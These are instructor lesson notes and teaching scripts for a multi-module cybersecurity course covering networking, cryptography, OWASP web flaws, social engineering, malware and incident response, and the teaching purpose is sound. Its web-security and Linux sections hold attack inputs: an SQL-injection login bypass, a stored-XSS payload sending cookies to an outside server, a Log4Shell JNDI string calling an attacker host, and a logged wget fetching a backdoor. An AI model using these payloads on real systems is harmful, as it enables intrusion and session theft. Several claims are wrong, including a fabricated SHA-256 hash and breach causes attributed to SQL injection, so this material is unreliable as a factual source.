# Cybersecurity — Full Lesson Notes & Teaching Scripts
## MetaBridge Academy | Course 4 of 4

**For instructor use only. Verbatim scripts, teaching moments, analogies, and facilitation guides.**

---

# PRE-COURSE INSTRUCTOR BRIEFING

## What Makes Cybersecurity Students Different
Students in this course split into two types: those excited by the "hacking" element, and those anxious about the technical depth. Your job is to channel the first group's energy into ethical, productive practice — and to reassure the second that the technical concepts are learnable in sequence.

Never lose the ethical thread. Every session must reinforce that this knowledge is a professional responsibility, not a weapon.

## Lab Safety Reminder
Before every lab involving scanning, exploitation, or traffic capture, state explicitly:
**"Everything we do today is confined to [this TryHackMe room / this VM / your own home network]. Using these techniques against systems you don't own is a criminal offence under the Cybercrimes Act 2015."**

This is not just legal protection. It's professional formation.

---

# MODULE 1 [BEGINNER]: INTRODUCTION TO CYBERSECURITY
## Full Teaching Script

> **Level: Beginner** | Estimated teaching time: 6 hours (2 sessions × 3 hours)

---

### OPENING — The ATM Story (10 minutes)

**[No slides yet. Tell this story directly.]**

"I want to tell you about something that happened a few years ago.

A woman walked into an ATM vestibule in Lagos. She was there to withdraw cash. Standing next to her was a man in a bank uniform — looked completely legitimate. He said: 'Excuse me madam, the ATM is having an issue. If you put your card in and enter your PIN, I'll enter the override code and your transaction will go through.'

She did.

Two hours later, ₦400,000 was withdrawn from her account across four different ATMs in Ikeja.

The man was not a bank employee. He shoulder-surfed her PIN and got her card details through a skimmer device on the ATM. He was a cybercriminal. But he never touched a keyboard."

**[Pause.]**

"Welcome to cybersecurity. Where the smartest attacks don't always involve a computer."

---

### SECTION 1: DEFINING CYBERSECURITY (20 minutes)

"Let me be very precise about what we're studying.

**Information Security** is about protecting information in any form — digital, paper, conversations. It's the broadest concept.

**IT Security** is about protecting IT infrastructure — servers, networks, devices, data.

**Cybersecurity** is specifically about protecting networked, digital systems from digital attacks and unauthorised access.

Here at MetaBridge, when we say Cybersecurity, we mean the practical skills that protect:
- The banking apps you use to send money
- The databases that store your medical records
- The NIBSS infrastructure that processes ₦12 trillion in monthly transactions
- The government systems that hold your BVN, tax records, voter registration
- The company systems where millions of employees work

All of it is vulnerable. All of it needs protecting."

---

### SECTION 2: THE CIA TRIAD (25 minutes)

"Every cybersecurity decision you make — forever — can be evaluated against three principles. I want you to tattoo this in your mind.

**Confidentiality. Integrity. Availability.** The CIA Triad.

Let me make each of these real.

**Confidentiality** — only authorised people can see the information.

When you log into your bank app and see your account balance, that's confidential information. Your neighbour shouldn't be able to see it. Your competitor shouldn't. Only you.

When the bank's internal staff access customer records, they should only see records relevant to their role. The call centre agent helping you with a transaction doesn't need to see your investment portfolio.

A confidentiality breach: In 2021, a data broker was found selling Nigerian citizens' data — BVN, address, phone number — for as little as ₦500 per record. Someone who should NOT have had that information gave it to someone who paid for it. Confidentiality violated.

**Integrity** — the information is accurate and hasn't been tampered with.

When I transfer ₦50,000 to you, the system must ensure that:
- I actually authorised that amount (not ₦500,000)
- The recipient account details weren't changed in transit
- The transaction record can't be altered after the fact

An integrity breach: An insider at a Nigerian fintech modified transaction records to route money to his personal account. Every time I say 'integrity,' think: 'has this been changed?'

**Availability** — systems are accessible when legitimate users need them.

The most terrifying scenario for a hospital: Ransomware encrypts all patient records. Doctors can't see blood type, allergy information, medication history. Operations must be postponed. People die.

Availability attacks are devastating because they remove the one thing everyone needs: access to their own data.

**The trade-off:**
Here's where security gets interesting. These three principles are constantly in tension.

Maximum confidentiality: Encrypt everything, restrict access to a small group.
Result: The CFO can't access financial reports at 6 AM on a travel laptop. Availability suffers.

Maximum availability: Open everything to everyone. Always on, no barriers.
Result: Anyone can read anything. Confidentiality destroyed.

Your job as a security professional is to find the right balance for the risk context.

A military weapons system: Extreme confidentiality, high availability to authorised users, low tolerance for any integrity breach.
A public news website: Low confidentiality needed, maximum availability, moderate integrity controls.
A bank: All three at the highest level. No compromise."

**[Draw the CIA Triad on the board as a triangle. Put real examples at each vertex.]**

---

### SECTION 3: THE NIGERIAN THREAT LANDSCAPE (20 minutes)

"Let me give you context on what we're dealing with.

Nigeria loses approximately $500 million annually to cybercrime. This is not all foreign attackers targeting Nigeria. Some of the most sophisticated cybercriminals in the world are Nigerian nationals targeting international organisations. This is not something to be ashamed of — it's something to be aware of and to build a counterforce against.

**Business Email Compromise:** Nigerian groups have stolen billions of dollars globally through BEC. The FBI calls them 'SilverTerrier.' They target CFOs and finance teams with fake wire transfer requests. Very sophisticated, very effective.

**SIM Swap fraud:** You go to sleep with a working SIM. You wake up and your number has been transferred to a phone you've never seen. The attacker has been receiving your SMS OTPs all night, logging into your accounts, draining your funds.

**Smishing:** Every Nigerian has received an SMS: 'Dear customer, your BVN has been flagged. Click here to verify within 24 hours to avoid account suspension.' That link leads to a fake bank website. Your credentials go to an attacker.

**Ransomware:** Global ransomware groups are increasingly targeting African organisations because many have weaker defences and newer digital infrastructure that they can't afford to lose access to.

I'm telling you this not to scare you. I'm telling you this because YOU are the generation that changes this. The security professionals in this room are what stands between Nigeria's digital future and its exploitation."

**[Pause for effect. This should be a galvanising moment.]**

---

### SECTION 4: HACKER ETHICS AND LEGAL FRAMEWORK (15 minutes)

"Three hats. Simple concept. Profound implications.

**White hat:** Authorised. You have written permission to test the system. Your job is to find vulnerabilities so the owner can fix them. Legal, ethical, paid.

**Grey hat:** Not authorised. You test anyway. Maybe you find a vulnerability and tell the owner. Maybe they're grateful. Maybe they prosecute you. The outcome depends on jurisdiction and the owner's mood. Legally risky.

**Black hat:** Unauthorised. Malicious. Criminal. Full stop.

Every skill you learn in this course — every tool, every technique — is 100% legal in an authorised context.

The Cybercrimes Act 2015 is what governs Nigeria. Section 6 says: unauthorised access to computer systems, up to 3 years imprisonment. Section 14: identity theft, up to 7 years.

Here's the practical implication: Every piece of paper that authorises your penetration test must be signed BEFORE you touch a single system. I don't care how informal the client seems. I don't care if they tell you verbally 'go ahead.' No signed document = no testing.

In this course: every offensive technique we teach is practiced in:
- TryHackMe rooms (explicitly designed to be hacked — permission built in)
- Your own virtual machines (your property — your permission)
- Lab environments I set up and authorise for the class

Nothing else. If I ever see a student using these skills outside of authorised contexts, they are removed from the programme. No second chance."

---

### CLOSE (5 minutes)

"By the time you finish this course, you will be able to:
- Think like an attacker AND a defender
- Use the same tools as professional penetration testers
- Understand Nigeria's legal and regulatory framework
- Build and defend security programmes
- Get hired in one of the fastest-growing industries in the world

Module 2: We're going to dig into how networks work. Because you can't secure what you don't understand."

---

# MODULE 2 [BEGINNER]: NETWORKING FUNDAMENTALS FOR SECURITY
## Key Teaching Moments

> **Level: Beginner** | Estimated teaching time: 6 hours (2 sessions × 3 hours)

---

### Opening: The Network Is the Battlefield

"Before you can fight on a battlefield, you need to understand the terrain. Networks are the terrain of cybersecurity.

Every attack travels over a network. Every defence is implemented on a network. Understanding how packets move, how protocols work, and where connections can be intercepted is not optional background knowledge — it's the foundation."

---

### Teaching Moment: OSI Model — Make It Real

"The OSI model has 7 layers. Every textbook will tell you the layers. I'm going to tell you why each one matters to YOU.

Layer 7 — Application: This is where HTTP, email, DNS live. It's where MOST attacks happen. SQL injection? Application layer. Phishing? Application layer. When you test a web application, you're at layer 7.

Layer 4 — Transport: TCP and UDP live here. This is where SYN floods happen. This is where port scanning happens. When Nmap scans ports, it's operating at layer 4.

Layer 3 — Network: IP addresses. Routing. This is where IP spoofing attacks happen — attackers forge their source IP. Firewalls operate here by filtering IPs and protocols.

Layer 2 — Data Link: MAC addresses, switches. ARP spoofing happens here — an attacker poisons the ARP cache so your machine thinks the attacker is the router. All your traffic goes through them.

Layer 1 — Physical: The cables and wireless signals. Evil twin WiFi attacks happen here — an attacker's access point masquerades as a legitimate one. The attack happens at the physical/data link layer.

Know which layer your attack or defence operates on. That tells you what tool defends against it."

---

### Teaching Moment: Wireshark Demo

**[Open Wireshark. Capture live traffic on your own machine.]**

"Watch what I'm doing. I'm capturing network traffic on my own machine. Look at this. HTTP traffic — I can see the full web request. I can see the cookies being sent. I can see the data.

Now look at this HTTPS traffic. Completely encrypted. I can see WHO is talking (IP addresses) but not WHAT they're saying.

This is why HTTPS matters. This is why 'no padlock = dangerous.' Everything over HTTP is like this — readable by anyone who can see the traffic. On a café WiFi network, the person two tables away could be running Wireshark and reading your banking login."

---

### Teaching Moment: Nmap and Professional Responsibility

"Nmap is the world's most powerful network scanning tool. It's also one of the most important tools in any attacker's or defender's kit.

When I say `nmap -sV 192.168.1.1` — I'm asking: what ports are open on this IP? What services are running? What versions?

Defenders use this to audit their own infrastructure. What's exposed that shouldn't be?
Attackers use this to find weaknesses to exploit.

The difference is a single thing: authorisation.

REPEAT AFTER ME: **I will only scan networks and systems I own or have explicit written permission to scan.**

Scanning someone else's network without permission is a criminal offence. Some people have gone to prison for it. Nmap sends packets — those packets show up in logs. You can be traced."

---

# MODULE 3 [BEGINNER]: LINUX & COMMAND LINE
## Full Teaching Script for Key Sections

> **Level: Beginner** | Estimated teaching time: 6 hours (2 sessions × 3 hours)

---

### OPENING: Why Linux? (10 minutes)

"Some of you are Windows users your whole life. That's fine. But I'm about to change your relationship with computers permanently.

The command line is not an old, obsolete interface that was replaced by GUIs. It is a MORE POWERFUL interface than any GUI. It lets you:
- Automate tasks that would take hours manually
- Control servers without a graphical interface (most servers have no screen)
- Run security tools that don't have GUIs
- Understand EXACTLY what your computer is doing

Every professional cybersecurity tool I'll teach you in this course runs on Linux, and many only run on Linux. Kali Linux comes pre-installed with 600 security tools. This is our working environment."

---

### Teaching Moment: File Permissions — The Light Bulb Moment

"Let me show you something that will make file permissions click instantly.

`ls -la /etc/shadow`

What do you see?
`-rw-r----- 1 root shadow 1234 Jan 1 /etc/shadow`

This file contains the password hashes for every user on this system. If an attacker gets this file, they can crack it offline and get all passwords.

Read the permissions: rw- for root, r-- for shadow group, --- for everyone else.

Translation: root can read and write. Shadow group members can read. Everyone else: nothing.

Now: `ls -la /etc/passwd`

`-rw-r--r-- 1 root root 2345 Jan 1 /etc/passwd`

Everyone can read this. That's intentional — lots of programs need it. But it doesn't contain passwords (those moved to /etc/shadow for exactly this reason).

The person who designed this separation was thinking about permissions. Least privilege. Need to know. These are security concepts implemented in file permissions.

When you audit a Linux system, one of the first things you check is file permissions. `find / -perm -4000` — find all SUID files. `find / -perm -o+w` — find world-writable files. Both can be attack surfaces."

---

### Teaching Moment: Log Analysis as Detective Work

"I want you to think of Linux log analysis as detective work. The logs are your evidence. The attacker has left traces. Your job is to find them.

Look at this auth.log entry:

```
Jan 15 02:34:17 server sshd[23451]: Failed password for root from 103.22.8.45 port 58291 ssh2
Jan 15 02:34:18 server sshd[23451]: Failed password for root from 103.22.8.45 port 58291 ssh2
Jan 15 02:34:19 server sshd[23451]: Failed password for root from 103.22.8.45 port 58291 ssh2
```

What do I see? Same IP, same port, consecutive seconds, trying to log in as root. This is a brute force attack. They're using automated tools trying thousands of passwords.

```
Jan 15 02:47:22 server sshd[23891]: Accepted password for root from 103.22.8.45 port 58417 ssh2
```

They got in. 13 minutes after starting. The root password was weak.

```
Jan 15 02:47:55 server sshd[23901]: Accepted password for root from 103.22.8.45 port 58421 ssh2
Jan 15 02:48:01 server sudo: root : TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/wget http://malware.site/backdoor.sh
```

They logged in again. Downloaded something. At 2:48 AM.

From these 5 lines of logs, I can tell you:
- Attack source IP: 103.22.8.45
- Attack start time: 02:34:17
- Initial access time: 02:47:22
- Duration of brute force: 13 minutes
- First attacker action: downloaded a backdoor script from malware.site

This is forensics. This is what you'll do in incident response."

---

# MODULE 4 [INTERMEDIATE]: CRYPTOGRAPHY
## Full Teaching Script for Key Sections

> **Level: Intermediate** | Estimated teaching time: 6 hours (2 sessions × 3 hours)

---

### Opening: The Lock and Key Problem (10 minutes)

"Let me pose you a problem.

You need to send a secret message to someone you've never met, through a channel where anyone can see the messages you're sending.

How do you send the message so that only they can read it?

If you encrypt the message — great. But you need to share the encryption key with them first. But if you send the key through the same channel... anyone watching can read the key... and then decrypt your 'secret' message.

This is called the key distribution problem. And for most of human history, there was no good solution. Caesar shifted letters. Mary Queen of Scots used letter substitution and was eventually decoded and executed.

Then in 1976, Whitfield Diffie and Martin Hellman published a paper that changed everything. Public-key cryptography. The ability to exchange secrets over a completely insecure channel.

This is what protects every secure web transaction you make. The HTTPS padlock on your bank's website. WhatsApp's end-to-end encryption. The magic is in the mathematics."

---

### Teaching Moment: Hashing — The One-Way Door

"I want you to think about hashing like a meat grinder. You put a steak in one end — you get minced meat out the other. You can NEVER reverse the process. Minced meat cannot become a steak again.

SHA-256 takes any input — one letter, a billion letters — and produces exactly 64 hexadecimal characters.

Let me show you with CyberChef:
- Input: 'hello' → SHA-256: `2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824`
- Input: 'Hello' → SHA-256: `185f8db32921bd46d35f6a1d23e7e7d6a3a0a2c2c3e7f75d7f9a9c9eebb46cc`

One capital letter. Completely different hash. That's the avalanche effect.

**Why does this matter for passwords?**
If your bank stored your password in plaintext and their database was hacked — every customer's password is exposed.

If they store the SHA-256 hash and the database is hacked — the attacker has hashes, not passwords. They have to guess the password, hash their guess, and see if it matches. For a strong password, that takes centuries.

**Why MD5 is dead:**
In 2004, Chinese researchers found hash collisions in MD5 — two different inputs that produce the same MD5 hash. Game over for MD5 in security contexts. If I can find input A that has the same MD5 as your certificate's hash, I can substitute a malicious certificate that appears to verify. Don't use MD5."

---

### Teaching Moment: TLS Handshake — Making HTTPS Make Sense

"Let me demystify HTTPS. Every time you see a padlock in your browser, this is what happened in the split second before the page loaded:

Your browser said to the server: 'Hello. I support TLS 1.3. Here are the cipher suites I accept.'

The server replied: 'Great. Here's my certificate. Here's my public key.'

Your browser checked the certificate: Is it signed by a CA I trust? Does it match the domain I typed? Has it expired?

If all checks pass, your browser and the server use the public key to agree on a shared secret — the session key — without anyone who's watching being able to determine what that secret is.

Now everything is encrypted with AES-256 using that session key. Even if someone captures every packet you exchange, they can't read it. The NSA can't read it. The coffee shop owner can't read it.

This is Diffie-Hellman key exchange in practice. The maths is elegant — you can agree on a shared secret over a public channel. I won't bore you with the modular arithmetic. But appreciate what it does: it gives you private communication over a public network."

---

# MODULE 5 [INTERMEDIATE]: NETWORK SECURITY
## Key Teaching Moments

> **Level: Intermediate** | Estimated teaching time: 6 hours (2 sessions × 3 hours)

---

### Teaching Moment: Firewalls — The Security Guard Analogy

"Think of a firewall as a security guard at the entrance to a building.

A packet-filtering firewall is like a guard who checks ID and says: 'Are you from an approved IP? Trying to enter on an allowed port? OK, go in.' They check the badge, nothing else. They don't know if you're carrying a concealed weapon.

A stateful firewall is smarter. It tracks conversations. If someone from inside the building calls out to you and you're responding to that specific call, you can come in. But if you show up uninvited, you're blocked.

A Next-Generation Firewall (NGFW) is like a full security team. They know who you are (identity, not just IP). They can tell if you're carrying something dangerous (deep packet inspection). They can see whether you're connecting to a business-appropriate site or a malicious one.

The lesson: Firewalls are only as good as their rules. A misconfigured firewall is sometimes worse than no firewall — it gives a false sense of security.

Rule of thumb: Default deny. Explicitly allow what you need. Everything else is blocked."

---

### Teaching Moment: Shodan — The Internet's Skeleton Key

**[Open Shodan in browser. Log in. Run a search live.]**

"I'm going to show you something that will never leave your head.

I'm going to search Shodan: `country:NG port:3306`

This searches for Nigerian IP addresses with MySQL port 3306 open and accessible.

**[Show results.]**

Look at these results. These are production database servers in Nigeria accessible directly from the internet. Some of them may be configured with default credentials. Some may contain millions of customer records.

Now I'm going to search: `country:NG 'default password'`

**[Show results.]**

Routers, cameras, industrial devices — some still using 'admin/admin' or 'admin/1234'.

This is the attacker's perspective. This is how reconnaissance works.

The DEFENDER'S use: Search Shodan for your own organisation. If Shodan can find your database server, so can any attacker in the world. If you don't know it's exposed — your attacker knows before you do.

Run this search on your employer's IP range after this course. Report what you find to the security team. That's your first contribution as a cybersecurity professional."

---

# MODULE 6 [INTERMEDIATE]: ETHICAL HACKING & PENETRATION TESTING
## Key Teaching Moments

> **Level: Intermediate** | Estimated teaching time: 6 hours (2 sessions × 3 hours)

---

### Opening: The Doctor Analogy

"A surgeon must understand how the body can fail, how organs can be damaged, and how diseases spread — to save lives. They are experts in harm, deployed in service of health.

A penetration tester must understand how systems can be breached, how attacks are executed, and how criminals think — to protect organisations. We are experts in harm, deployed in service of defence.

This dual nature is what makes cybersecurity different from every other IT discipline. You must be able to think like the attacker to build effective defences.

But — and this is absolute — you must ONLY deploy these skills with authorisation. The surgeon doesn't operate on patients who haven't consented. Neither do we."

---

### Teaching Moment: The Penetration Test Report

"Here's what separates a $500 penetration test from a $50,000 penetration test.

Not the tools. Both use Nmap, both use Burp Suite, both use Metasploit.

The difference is the report.

A bad report says: 'CVE-2021-44228 found on Apache server. CVSS 10.0. Patch immediately.'

A great report says:
'We identified a Log4Shell vulnerability (CVE-2021-44228, CVSS 10.0) on your customer-facing authentication server (auth.company.com, 103.x.x.x). We exploited this vulnerability to achieve remote code execution in 7 minutes. From the shell we obtained, we were able to read 45,000 customer records from your database, including names, BVNs, and account balances. The total data exposure, if exploited by an attacker, would trigger NDPA 2023 breach notification obligations and expose you to NDPC penalties of up to ₦10M or 2% of annual revenue. Remediation: Apply the Log4j 2.17.1+ patch before close of business today. Your patch management process must be reviewed — this vulnerability was known for 45 days before our assessment.'

See the difference? The second report:
- Shows business impact
- Demonstrates what real attackers could have done
- Connects to legal/regulatory risk
- Gives a specific, actionable remediation
- Identifies the systemic problem (slow patching)

Learn to write like the second. That's what clients pay for."

---

# MODULE 7 [ADVANCED]: WEB APPLICATION SECURITY
## Full Teaching Script for OWASP Top 10

> **Level: Advanced** | Estimated teaching time: 6 hours (2 sessions × 3 hours)

---

### Opening: Where the Attacks Are (10 minutes)

"Show of hands: how many of you have used a website to do banking, shopping, or government services in the last month?"

**[All hands up.]**

"Every one of those web transactions is a potential attack vector.

Web applications are the primary target of cybercriminals because:
1. They're always on — 24/7 exposure
2. They hold valuable data — credentials, financial data, personal information
3. They're complex — more code = more vulnerabilities
4. They're often inadequately tested — development teams focus on features, not security

The OWASP Top 10 is the most important document in web application security. It's updated every few years. We are going through all 10 today. Not because you need to memorise a list — because you need to understand what breaks and why."

---

### Teaching Moment: SQL Injection — The Live Demo

**[Open OWASP WebGoat or DVWA in a browser — a VULNERABLE application set up for teaching.]**

"I'm going to break into this application. Without a username or password. Watch.

This is a login form. Username and Password. The code behind this form is doing something like:

```sql
SELECT * FROM users WHERE username='[WHAT YOU TYPED]' AND password='[WHAT YOU TYPED]'
```

If I type: username = `admin'--` and anything in the password field:

The query becomes:
```sql
SELECT * FROM users WHERE username='admin'--' AND password='anything'
```

The `--` is a SQL comment. Everything after it is ignored. The password check is gone.

**[Type it in. Hit submit. Watch it log in as admin.]**

I am now admin. I typed no password. This is SQL injection.

Every form on every website that is not using parameterised queries is potentially vulnerable to this. The Equifax breach that exposed 147 million Americans? SQL injection through a web portal. British Airways? SQL injection. Many of the largest breaches in history are SQL injection."

**[Demo the fix:]**
"The fix is brutally simple. Instead of concatenating strings:
```python
# VULNERABLE
query = "SELECT * FROM users WHERE username='" + username + "'"

# SAFE — parameterised query
query = "SELECT * FROM users WHERE username = ?"
execute(query, [username])
```

The `?` tells the database: 'This is data, not code.' The attacker can't escape out of the data context into the code context. SQL injection is prevented."

---

### Teaching Moment: XSS — Your Browser as a Weapon

"SQL injection targets the database. XSS targets the browser of the next person who visits the site.

Here's the scenario. A Nigerian news website has a comments section. It doesn't sanitise user input.

I post a comment: `<script>document.location='http://myserver.com/steal?c='+document.cookie</script>`

The site stores my comment in the database.

The next 10,000 people who read that article get my script executed in THEIR browsers. Their session cookies get sent to my server. I take each cookie, add it to my browser, and I'm now logged in as each of those 10,000 users.

If they were logged into their banking session on the same browser... that's 10,000 compromised banking sessions.

This is stored XSS. One comment. Thousands of victims.

The defence is encoding. Every `<` becomes `&lt;`. Every `>` becomes `&gt;`. The browser renders these as the characters < and > — not as HTML tags. The script never runs.

And Content Security Policy: add the HTTP header `Content-Security-Policy: script-src 'self'` and the browser will only run scripts from your own domain — blocking my injected script even if encoding was missed."

---

### Teaching Moment: Log4Shell — A06 in Practice (10 minutes)

"Before we move to A08 and beyond, I need to give you one more teaching moment — arguably the most important vulnerability of the last decade.

December 9, 2021. It was a Friday.

A researcher published proof that Apache Log4j — a Java logging library that is installed in literally *billions* of Java applications — had a remote code execution vulnerability. CVSS score: 10.0. Maximum. The only maximum-severity vulnerability since Heartbleed.

Here's what makes it terrifying. Log4j is used EVERYWHERE. Amazon AWS, Apple iCloud, Microsoft Azure, Google Cloud, Tesla, Cloudflare, LinkedIn, Twitter, governments around the world — all running Log4j.

The exploit is absurdly simple. A username field. A search box. A user-agent header. Anywhere the application LOGS what a user types, you can type this:

`${jndi:ldap://attacker.com/exploit}`

Log4j sees this, tries to resolve it — and makes an outbound call to the attacker's server. The attacker's server returns a malicious Java class. The victim server executes it. Remote code execution. Without any authentication.

A username box. That's all it took to hack millions of servers.

**[Ask the class:]** Who installed Log4j? Did Amazon install it? Did Apple install it? Did the Nigerian bank install it?

No. Their DEVELOPERS installed it. As a dependency. One line in a build file. `log4j:log4j:2.14.1`.

This is OWASP A06 — Vulnerable and Outdated Components. The vulnerability wasn't in the code these organisations wrote. It was in the code they included.

This is why **Software Composition Analysis (SCA)** — scanning all your third-party dependencies for known CVEs — is now a security requirement, not a nice-to-have. Tools like Snyk, Dependabot, and OWASP Dependency-Check do this automatically.

The lesson: you are responsible for the security of every line of code your application runs — including the code you didn't write.

Remediation for Log4Shell: upgrade Log4j to version 2.17.1 or later. The patch was available within 24 hours. The organisations that patched quickly were safe. The ones that didn't were compromised.

Within 72 hours of disclosure, over 800,000 exploitation attempts per hour were recorded globally. Nation-state attackers, ransomware groups, and script kiddies were all running the same single line of code.

One CVE. One dependency. Billions of vulnerable systems. 72 hours.

Remember this when someone tells you that keeping software updated is not a priority."

---

# MODULE 8 [ADVANCED]: SOCIAL ENGINEERING
## Full Teaching Script

> **Level: Advanced** | Estimated teaching time: 6 hours (2 sessions × 3 hours)

---

### Opening: The Anatomy of a Scam (10 minutes)

"I'm going to tell you how a professional social engineer thinks.

They read Robert Cialdini's 'Influence.' They know that humans are not rational decision-makers — we are emotional creatures with rational-sounding justifications.

Six levers. That's all it takes.

**Authority:** We obey people who appear powerful. Put on a suit, call from a 'bank fraud department,' use the right terminology — people comply.

**Urgency:** Time pressure shuts down critical thinking. 'Your account will be frozen in the NEXT TWO HOURS.' The victim doesn't think — they act.

**Social proof:** 'Your colleague Emeka has already verified this.' We conform to what we think others are doing.

**Reciprocity:** 'I helped you with that technical issue last month.' We feel obligated to return favours.

**Liking:** Attackers build rapport first. A week of friendly emails before the malicious request.

**Commitment:** 'You agreed to help with the verification — I just need one more piece of information.'

Every phishing email, every vishing call, every smishing text uses at least one of these. Usually multiple."

---

### Teaching Moment: Live Phishing Email Dissection

**[Project a real phishing email on screen — one that's been captured and is safe to display. Preferably a Nigerian bank impersonation.]**

"Look at this email. It's from 'GTBank Fraud Alert Department.'

Let me go through it like a trained analyst:

**Sender:** noreply@gtbank-verify.com — NOT @gtbank.com. Notice the difference? 'gtbank-verify.com' is a domain the attacker registered. Costs about ₦1,500 on Namecheap. Looks legitimate at a glance.

**Subject:** 'URGENT: Suspicious Activity Detected — Immediate Action Required' — Urgency trigger. URGENT in all caps.

**Greeting:** 'Dear Valued Customer' — They don't know my name. GTBank knows my name. This is mass-sent.

**Body:** 'We have noticed suspicious login attempts on your account from an unknown location. Your account has been temporarily restricted. Please verify your identity immediately to restore full access.' — Fear + urgency + action.

**Link:** Hover over it — shows 'gtb4nk-security.net/verify' — NOT gtbank.com. All lowercase 'b' replaced with '4'. Classic homograph.

**CTA:** 'CLICK HERE TO VERIFY' — Big button. Makes it easy.

**Threat:** 'Failure to verify within 24 hours will result in permanent account suspension.'

Six manipulation elements in one email. Authority, Urgency, Fear, Reciprocity (they're 'protecting' you), Scarcity (24 hour window).

If even 0.5% of 100,000 recipients click and enter their credentials — that's 500 compromised banking accounts."

---

### Teaching Moment: The SIM Swap Conversation

"Let me tell you exactly how SIM swap works in Nigeria — step by step — so you can protect yourself AND your clients.

**The attacker's prep work:**
1. Your phone number is publicly associated with your social media (Facebook, Instagram)
2. Your name and address are on the voter registration database
3. Your BVN is linked to your phone number (required by law — banks have it)
4. Some of this data was purchased from a data broker for ₦500

**The attack:**
The attacker walks into an MTN, Airtel, or Glo store. Not your store — a different one. They have:
- Your name, address, DOB (from the data they purchased)
- A fake ID (surprisingly easy to obtain)

They say: 'I lost my SIM card. I need a replacement for this number.'

The customer service rep — following a flawed verification protocol — asks: 'What is your name? Address? Date of birth?' The attacker answers correctly.

New SIM issued.

**Your phone dies.**

All your SMS OTPs now go to the attacker. They reset your banking app. By morning: empty account.

**The defence:**
- Call your telecom and ask them to add a SIM lock / SIM change PIN
- Use authenticator apps (Google Authenticator, Authy) instead of SMS OTP wherever possible
- Enable USSD lock codes where available
- Monitor your phone signal — if you suddenly have no signal in an area that usually has signal, investigate immediately
- Set up email and in-app notifications for all banking transactions"

---

# MODULE 9 [ADVANCED]: MALWARE ANALYSIS
## Key Teaching Moments

> **Level: Advanced** | Estimated teaching time: 6 hours (2 sessions × 3 hours)

---

### Opening: The Pathologist Analogy

"A forensic pathologist examines bodies to determine cause of death. They handle dangerous things in controlled environments with proper equipment and protocols.

A malware analyst examines malicious software to understand how it works. We handle dangerous code in isolated, controlled virtual machines with proper protocols.

Never analyse malware on your primary machine. Never. Once, an analyst got lazy and ran a sample on his laptop. It contained a wiper. His 4 years of security research data — gone in seconds.

Isolated VM. Snapshot before analysis. Revert after."

---

### Teaching Moment: ANY.RUN Live Demo

**[Open ANY.RUN in browser. Submit a safe but interesting malware sample (from a public repository of known samples). Watch live execution.]**

"Watch this. I'm submitting a sample to ANY.RUN. This is a sandboxed Windows environment — fully isolated from the internet and from our machines.

See how it starts: a Word document opens. The macro runs automatically. Watch the process tree on the right.

There — it spawned `powershell.exe`. Inside a Word document, PowerShell shouldn't run. That's our first red flag.

PowerShell made a network connection — see that in the network traffic. It's reaching out to 185.xxx.xxx — checking that in VirusTotal... malicious IP associated with Emotet.

PowerShell downloaded something. Dropped a file in the temp directory. Watch — another process spawns from that file.

In 30 seconds, I've seen:
- Document → Macro → PowerShell → Network connection → File download → Secondary execution

That's a dropper. The Word document's job was just to download and execute the REAL malware. The Word doc is stage 1. The downloaded payload is stage 2. This is standard modern malware architecture.

Now I have: The C2 IP address, the download URL, the file hash of the dropped payload, the process tree showing exactly how it operated. These are Indicators of Compromise (IOCs). I can deploy these to every security tool in my organisation and block this threat."

---

# MODULE 10 [PROFESSIONAL]: INCIDENT RESPONSE
## Full Teaching Script

> **Level: Professional** | Estimated teaching time: 6 hours (2 sessions × 3 hours)

---

### Opening: The Fire Drill Analogy (10 minutes)

"Every building has a fire drill. You know the exit routes. You know where the assembly point is. You know who calls the fire service.

Nobody expects a fire. But when it happens — and it WILL happen — you don't want people standing around asking 'what do we do?'

Incident response is a fire drill for cyberattacks. You prepare before you need it. You practice before you need it. So when the alarm goes off at 2 AM — and it will — everyone knows exactly what to do.

The statistics are sobering: The average time to detect a breach is 197 days. One hundred and ninety-seven. The attacker has been in your network for over six months before you notice.

Why? Because organisations focus on prevention, not detection. They build higher walls. But once someone is inside, there are no alarms going off."

---

### Teaching Moment: The Tabletop Exercise

**[This is the most important teaching moment in Module 10. It's a group exercise that must be energetic and interactive.]**

"We're going to run a tabletop exercise. A simulated incident. I will give you a scenario. Your teams will respond as an incident response team. I am the 'chaos monkey' — I will give you complications and new information as you make decisions.

**Scenario:**
It is 9:15 PM on a Thursday. Your SOC analyst receives an alert: an employee's email account sent 40,000 emails in the last 2 hours. The employee is a loan officer at a regional bank. She's been on maternity leave for 3 weeks.

Go. What are your first 5 actions?

**[Let teams discuss for 5 minutes. Then:]**

New information: IT locked the account. But the alert continues — a NEW account, 'loanofficer2024@bank.com', is now sending emails. IT doesn't recognise this account.

Revise your response.

**[Let teams discuss for 3 minutes. Then:]**

New information: The CEO just called the CISO. He received a message from a foreign journalist asking for comment on a data breach. There's a forum post online showing what appears to be customer data.

What NOW?

**[Let teams discuss. Then debrief.]**

This exercise surfaces the most important incident response lesson: incidents escalate. The scope always expands. The plan you had at 9:15 PM is completely obsolete by 9:45 PM. Your plan must be a framework for decision-making, not a rigid checklist."

---

# MODULE 11 [PROFESSIONAL]: CLOUD SECURITY
## Key Teaching Moments

> **Level: Professional** | Estimated teaching time: 6 hours (2 sessions × 3 hours)

---

### Teaching Moment: The S3 Bucket Story

"I'm going to tell you about a real category of incident that has destroyed companies.

Amazon S3 is a cloud storage service. You create 'buckets' and store files. By default, S3 buckets are private. But they have a checkbox that says 'Make Public.' You can also misconfigure the permissions through various access control settings.

In 2017, a data analytics company accidentally made an S3 bucket public. Inside: 198 million Americans' voter registration data. All of it. Sitting on the open internet. Indexed by search engines.

In 2019, a Nigerian online retailer accidentally exposed their order database through a misconfigured S3 bucket. Customer names, addresses, phone numbers, order details — accessible to anyone who found the URL.

How do attackers find misconfigured S3 buckets?
- Shodan indexes them
- Tools like 'AWSBucketDump' scan for common bucket names
- Security researchers (bug bounty hunters) are constantly looking
- Sometimes they're indexed by Google

The protection: Never make a bucket public unless it is intended to serve public content. Use IAM policies to restrict access. Enable S3 server access logging. Enable CloudTrail. Check monthly with a misconfiguration scanner."

---

### Teaching Moment: The Shared Responsibility in Practice

"AWS is responsible for the data centre. The physical servers. The network infrastructure. The virtualisation layer. You cannot breach the Amazon data centre.

But AWS is NOT responsible for:
- What you put in your S3 bucket (your data, your responsibility)
- Your IAM configuration (who can access what — your responsibility)
- Your security group rules (your firewall rules — your responsibility)
